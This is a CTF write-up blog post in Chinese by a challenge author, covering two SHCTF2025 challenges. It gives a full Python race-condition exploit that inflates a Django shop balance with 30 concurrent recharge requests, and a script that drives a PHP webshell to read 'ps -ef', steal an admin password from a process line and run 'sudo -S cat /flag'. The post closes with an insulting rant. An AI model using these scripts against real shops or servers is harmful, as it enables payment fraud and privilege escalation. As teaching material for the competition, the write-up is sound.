+++
title= "SHCTF2025"
slug= "shctf-2025"
description= "😅😅😅"
date= "2026-02-20T20:45:51+08:00"
lastmod= "2026-02-20T20:45:51+08:00"
image= ""
license= ""
categories= ["CTF"]
tags= ["Django"]

+++

## ez_race

框架是 Django，并且是个商城系统，很容易想到是条件竞争漏洞，当然新手师傅可能想不到，那么可以看看题目名，知道这个之后我们可以找到一篇文章，其中讲述了在开发过程中原子性和锁对竞态漏洞的保护性

https://mp.weixin.qq.com/s/9f5Hxoyw5ne8IcYx4uwwvQ 

```Python
#!/usr/bin/env python3
import re
import threading
import urllib.parse
import urllib.request
import http.cookiejar

# BASE_URL = "http://154.36.181.12:8080"
BASE_URL = "http://challenge-only-test-for-prepare.shc.tf:30413"

def get_csrf(html):
    m = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', html)
    return m.group(1) if m else None

def exploit():
    cj = http.cookiejar.CookieJar()
    proxy_handler = urllib.request.ProxyHandler({})
    opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPCookieProcessor(cj))
    
    login_html = opener.open(f"{BASE_URL}/accounts/login/").read().decode()
    csrf = get_csrf(login_html)
    
    login_data = urllib.parse.urlencode({
        "username": "player@example.com",
        "password": "player",
        "csrfmiddlewaretoken": csrf
    }).encode()
    
    opener.open(f"{BASE_URL}/accounts/login/", data=login_data)
    
    while True:
        opener.open(f"{BASE_URL}/reset")
        
        recharge_html = opener.open(f"{BASE_URL}/recharge").read().decode()
        recharge_csrf = get_csrf(recharge_html)
        
        recharge_data = urllib.parse.urlencode({
            "amount": 10,
            "csrfmiddlewaretoken": recharge_csrf
        }).encode()

        thread_count = 30
        barrier = threading.Barrier(thread_count)

        def recharge_task():
            try:
                barrier.wait()
                opener.open(f"{BASE_URL}/recharge", data=recharge_data)
            except Exception:
                pass

        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=recharge_task)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        try:
            status = opener.open(f"{BASE_URL}/status").read().decode()
            balance = int(status)
            # print(f"Current Balance: {balance}")
            
            if balance >= 50:
                buy_response = opener.open(f"{BASE_URL}/buy/flag")
                print(f"{buy_response.read().decode()}")
                break
        except Exception:
            pass

if __name__ == "__main__":
    exploit()
```

## sudoooo0

本意是sudo令牌进程注入，但是没想到这环境实在难弄，于是弄了一个简单的，就是查看进程即可窃取管理员密码，也希望大家在渗透过程中，getshell 之后多看看进程，说不定就有所收获了呢？

```Python
import requests, re, base64, sys

url = "http://154.36.181.12:8080/webshell.php"

def run(c):
    return requests.get(url, params={'cmd': f"system(base64_decode('{base64.b64encode(f'{c} 2>&1'.encode()).decode()}'));"}).text

try:
    pw = re.search(r'echo\s+([^\s\|]+)\s*\|', run("ps -ef")).group(1)
    res = run(f"script -q -c \"echo '{pw}' | sudo -S cat /flag\" /dev/null")
    print(re.search(r'SHCTF\{.*?\}', res).group(0))
except:
    pass
```

## 碎碎念

这个比赛出题我大概是11月就完成了，但是没想到最后比赛举办已经到了26年，而且在出**sudoooo0**这道题的时候，群里居然有人说`webshell.php`扫不到，想要我改到`shell.php`，招笑啊🤣🤣🤣🤣

以后不会给这类比赛出题了，对自己没好处，还被骂一顿，傻逼一个。
